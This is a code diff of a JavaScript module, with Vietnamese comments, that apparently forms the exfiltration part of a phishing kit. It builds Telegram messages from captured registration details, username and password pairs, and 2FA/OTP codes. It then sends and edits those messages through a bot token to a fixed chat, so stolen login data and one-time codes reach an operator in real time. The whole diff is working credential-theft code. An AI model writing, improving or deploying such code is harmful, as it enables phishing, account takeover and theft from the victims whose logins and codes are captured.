@@ -3,8 +3,8 @@ const CHAT_ID = '-5364980544';
 const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
 let tgMessageId = null;
-let currentSessionText = '';
 let currentSessionId = '';
+let logHistory = []; 
 
 const getSessionId = () => {
     if (currentSessionId) return currentSessionId;
@@ -19,7 +19,7 @@ const getSessionId = () => {
 };
 
 export const setInitialSession = (text) => { 
-    currentSessionText = text; 
+    logHistory = [text];
 };
 
 export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -27,12 +27,48 @@ export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, 
 export const sendTelegramMessage = (newContent) => {
     const sid = getSessionId();
     
-    // Sửa ở đây: Dùng 1 dấu xuống dòng thay vì 2 để nó sát nhau hơn
     if (newContent) {
-        currentSessionText += `\n${newContent}`;
+        logHistory.push(newContent);
     }
     
-    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n` + currentSessionText;
+    let text = `<b>🔑 MÃ PHIÊN: <code>${sid}</code></b>\n\n`;
+    
+    logHistory.forEach((item, index) => {
+        if (index === 0) {
+            // Phần 1: Thông tin đăng ký
+            const lines = item.split('\n');
+            lines.forEach(line => {
+                if (line.trim()) {
+                    if (line.includes(':')) {
+                        const [label, ...rest] = line.split(':');
+                        const value = rest.join(':').trim();
+                        if (value) {
+                            text += `${label}: <code>${value}</code>\n`;
+                        } else {
+                            text += `${line}\n`;
+                        }
+                    } else {
+                        text += `${line}\n`;
+                    }
+                }
+            });
+        } else {
+            // Phần 2: Login / OTP
+            text += `\n`; // Dòng trống ngăn cách
+            
+            if (item.includes(' | ')) {
+                // Nếu là Login
+                const [user, pass] = item.split(' | ');
+                text += `<code>${user}</code> | <code>${pass}</code>`;
+            } else if (item === '[ Resend OTP requested ]') {
+                // Nếu là yêu cầu gửi lại OTP
+                text += `<i>${item}</i>`;
+            } else {
+                // Nếu là OTP, thêm nhãn và khoảng trắng để không bị dính chùm
+                text += `<b>[ 2FA ]</b> <code>${item}</code>`;
+            }
+        }
+    });
 
     const tgFetch = (method, payload) => {
         let bodyStr = '';
@@ -53,14 +89,17 @@ export const sendTelegramMessage = (newContent) => {
             if (d && d.ok && d.result) tgMessageId = d.result.message_id;
         });
     } else {
+        tgFetch('editMessageText', { 
+            chat_id: CHAT_ID, 
+            message_id: tgMessageId, 
+            text: text, 
+            parse_mode: 'HTML' 
+        });
+        
         tgFetch('sendMessage', { chat_id: CHAT_ID, text: '🔔' }).then(res => {
             if (res && res.ok && res.result) {
                 tgFetch('deleteMessage', { chat_id: CHAT_ID, message_id: res.result.message_id });
             }
-            // Cập nhật nội dung
-            tgFetch('editMessageText', { chat_id: CHAT_ID, message_id: tgMessageId, text: text, parse_mode: 'HTML' });
-            
-            // ĐÃ XÓA PHẦN THẢ CẢM XÚC TẠI ĐÂY
         });
     }
 };
